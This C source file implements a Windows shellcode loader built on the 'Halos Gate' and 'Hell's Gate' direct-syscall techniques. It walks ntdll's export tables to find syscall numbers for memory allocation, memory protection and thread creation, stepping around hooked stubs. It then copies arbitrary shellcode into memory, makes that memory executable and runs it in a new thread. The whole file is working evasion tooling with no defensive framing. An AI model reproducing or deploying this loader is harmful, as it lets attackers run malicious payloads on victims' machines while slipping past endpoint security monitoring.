#include <Windows.h>
#include "halos_gate_struct.h"
#include <stdio.h>

extern VOID HellsGate(WORD wSystemCall);

extern HellDescent();

EXTERN_C PVOID getntdll();

EXTERN_C PVOID getExportTable(
        IN PVOID moduleAddr
);

EXTERN_C PVOID getExAddressTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
);

EXTERN_C PVOID getExNamePointerTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
);

EXTERN_C PVOID getExOrdinalTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
);

EXTERN_C PVOID getApiAddr(
        IN DWORD apiNameStringLen,
        IN LPSTR apiNameString,
        IN PVOID moduleAddr,
        IN PVOID ExExAddressTable,
        IN PVOID ExNamePointerTable,
        IN PVOID ExOrdinalTable
);

EXTERN_C DWORD findSyscallNumber(
        IN PVOID ntdllApiAddr
);

EXTERN_C DWORD halosGate(
        IN PVOID ntdllApiAddr,
        IN WORD index
);

PVOID ntdll = NULL;
PVOID ntdllExportTable = NULL;

PVOID ntdllExAddrTbl = NULL;
PVOID ntdllExNamePtrTbl = NULL;
PVOID ntdllExOrdinalTbl = NULL;

char ntAllocVMStr[] = "NtAllocateVirtualMemory";
DWORD ntAllocVMStrLen = 0;
PVOID ntAllocVMAddr = NULL;
DWORD ntAllocVMSyscallNumber = 0;


char ntProtectVirtualMemoryStr[] = "NtProtectVirtualMemory";
DWORD ntProtectVirtualMemoryStrLen = 0;
PVOID ntProtectVirtualMemoryAddr = NULL;
DWORD ntProtectVirtualMemoryNumber = 0;

char ntCreateThreadExStr[] = "NtCreateThreadEx";
DWORD ntCreateThreadExStrLen = 0;
PVOID ntCreateThreadExAddr = NULL;
DWORD ntCreateThreadExNumber = 0;

char ntWaitForSingleObjectStr[] = "NtWaitForSingleObject";
DWORD ntWaitForSingleObjectStrLen = 0;
PVOID ntWaitForSingleObjectAddr = NULL;
DWORD ntWaitForSingleObjectNumber = 0;


PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
    if (dest == NULL || src == NULL) {
        printf("[-] ptr is null\r\n");
        return NULL;
    }
    char *d = dest;
    char *s = src;
    if (d < s)
        while (len--)
            *d++ = *s++;
    else {
        char *lasts = s + (len - 1);
        char *lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}

void HALOS_GATE_MAIN(const unsigned char *shellcode, size_t size, boolean debug) {
    ntdll = getntdll();
    if (debug) {
        printf("[+] %p : NTDLL Base Address\r\n", ntdll);
    }
    ntdllExportTable = getExportTable(ntdll);
    if (debug) {
        printf("[+] %p : NTDLL Export Table Address\r\n", ntdllExportTable);
    }
    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdll);
    if (debug) {
        printf("[+] %p : NTDLL Export Address Table Address\r\n", ntdllExAddrTbl);
    }
    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdll);
    if (debug) {
        printf("[+] %p : NTDLL Export Name Pointer Table Address\r\n", ntdllExNamePtrTbl);
    }
    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdll);
    if (debug) {
        printf("[+] %p : NTDLL Export Ordinal Table Address\r\n", ntdllExOrdinalTbl);
    }

    ntAllocVMStrLen = sizeof(ntAllocVMStr);
    ntAllocVMAddr = getApiAddr(
            ntAllocVMStrLen,
            ntAllocVMStr,
            ntdll,
            ntdllExAddrTbl,
            ntdllExNamePtrTbl,
            ntdllExOrdinalTbl
    );
    if (debug) {
        printf("[+] %p : NTDLL.%s Address\r\n\r\n", ntAllocVMAddr, ntAllocVMStr);
        printf("[+] Using HalosGate technique to discover syscall for %s..\r\n", ntAllocVMStr);
    }

    DWORD index = 0;
    while (ntAllocVMSyscallNumber == 0) {
        index++;
        ntAllocVMSyscallNumber = halosGateUp(ntAllocVMAddr, index);
        if (ntAllocVMSyscallNumber) {
            ntAllocVMSyscallNumber = ntAllocVMSyscallNumber - index;
            break;
        }
        ntAllocVMSyscallNumber = halosGateDown(ntAllocVMAddr, index);
        if (ntAllocVMSyscallNumber) {
            ntAllocVMSyscallNumber = ntAllocVMSyscallNumber + index;
            break;
        }
    }
    if (debug) {
        printf("[+] %x : Syscall number for NTDLL.%s\r\n\r\n", ntAllocVMSyscallNumber, ntAllocVMStr);
    }

    ntProtectVirtualMemoryStrLen = sizeof(ntProtectVirtualMemoryStr);
    ntProtectVirtualMemoryAddr = getApiAddr(
            ntProtectVirtualMemoryStrLen,
            ntProtectVirtualMemoryStr,
            ntdll,
            ntdllExAddrTbl,
            ntdllExNamePtrTbl,
            ntdllExOrdinalTbl
    );

    if (debug) {
        printf("[-] Using HalosGate technique to discover syscall for %s..\r\n", ntProtectVirtualMemoryStr);
    }
    index = 0;
    while (ntProtectVirtualMemoryNumber == 0) {
        index++;
        ntProtectVirtualMemoryNumber = halosGateUp(ntProtectVirtualMemoryAddr, index);
        if (ntProtectVirtualMemoryNumber) {
            ntProtectVirtualMemoryNumber = ntProtectVirtualMemoryNumber - index;
            break;
        }
        ntProtectVirtualMemoryNumber = halosGateDown(ntProtectVirtualMemoryAddr, index);
        if (ntProtectVirtualMemoryNumber) {
            ntProtectVirtualMemoryNumber = ntProtectVirtualMemoryNumber + index;
            break;
        }
    }
    if (debug) {
        printf("[+] %x : Syscall number for NTDLL.%s\r\n\r\n", ntProtectVirtualMemoryNumber, ntProtectVirtualMemoryStr);
    }

    ntCreateThreadExStrLen = sizeof(ntCreateThreadExStr);
    ntCreateThreadExAddr = getApiAddr(
            ntCreateThreadExStrLen,
            ntCreateThreadExStr,
            ntdll,
            ntdllExAddrTbl,
            ntdllExNamePtrTbl,
            ntdllExOrdinalTbl
    );
    if (debug) {
        printf("[-] Using HalosGate technique to discover syscall for %s..\r\n", ntCreateThreadExStr);
    }
    index = 0;
    while (ntCreateThreadExNumber == 0) {
        index++;
        ntCreateThreadExNumber = halosGateUp(ntCreateThreadExAddr, index);
        if (ntCreateThreadExNumber) {
            ntCreateThreadExNumber = ntCreateThreadExNumber - index;
            break;
        }
        ntCreateThreadExNumber = halosGateDown(ntCreateThreadExAddr, index);
        if (ntCreateThreadExNumber) {
            ntCreateThreadExNumber = ntCreateThreadExNumber + index;
            break;
        }
    }
    if (debug) {
        printf("[+] %x : Syscall number for NTDLL.%s\r\n\r\n", ntCreateThreadExNumber, ntCreateThreadExStr);
    }

    ntWaitForSingleObjectStrLen = sizeof(ntWaitForSingleObjectStr);
    ntWaitForSingleObjectAddr = getApiAddr(
            ntWaitForSingleObjectStrLen,
            ntWaitForSingleObjectStr,
            ntdll,
            ntdllExAddrTbl,
            ntdllExNamePtrTbl,
            ntdllExOrdinalTbl
    );
    if (debug) {
        printf("[-] Using HalosGate technique to discover syscall for %s..\r\n", ntWaitForSingleObjectStr);
    }
    index = 0;
    while (ntWaitForSingleObjectNumber == 0) {
        index++;
        ntWaitForSingleObjectNumber = halosGateUp(ntWaitForSingleObjectAddr, index);
        if (ntWaitForSingleObjectNumber) {
            ntWaitForSingleObjectNumber = ntWaitForSingleObjectNumber - index;
            break;
        }
        ntWaitForSingleObjectNumber = halosGateDown(ntWaitForSingleObjectAddr, index);
        if (ntWaitForSingleObjectNumber) {
            ntWaitForSingleObjectNumber = ntWaitForSingleObjectNumber + index;
            break;
        }
    }
    if (debug) {
        printf("[+] %x : Syscall number for NTDLL.%s\r\n\r\n", ntWaitForSingleObjectNumber, ntWaitForSingleObjectStr);
    }

    char *shellcodeT = (char *) malloc(size);
    for (int i = 0; i < size; i++) {
        shellcodeT[i] = (char) shellcode[i];
    }

    NTSTATUS status;
    PVOID lpAddress = NULL;
    HellsGate(ntAllocVMSyscallNumber);
    status = HellDescent((HANDLE) -1, &lpAddress, 0, &size, MEM_COMMIT, PAGE_READWRITE);
    if (debug) {
        printf("[+] allocate memory for the shellcode: %ld\n", status);
    }
    VxMoveMemory(lpAddress, shellcodeT, size);
    if (debug) {
        printf("[+] write memory\n");
    }
    ULONG ulOldProtect = 0;
    HellsGate(ntProtectVirtualMemoryNumber);
    status = HellDescent((HANDLE) -1, &lpAddress, &size, PAGE_EXECUTE_READ, &ulOldProtect);
    if (debug) {
        printf("[+] change page permissions: %ld\n", status);
    }
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    HellsGate(ntCreateThreadExNumber);
    status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE) -1, (LPTHREAD_START_ROUTINE) lpAddress,
                         NULL, FALSE, NULL, NULL, NULL, NULL);
    if (debug) {
        printf("[+] create thread: %ld\n", status);
    }
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    HellsGate(ntWaitForSingleObjectNumber);
    status = HellDescent(hHostThread, FALSE, &Timeout);
    if (debug) {
        printf("[+] wait: %ld\n", status);
    }
}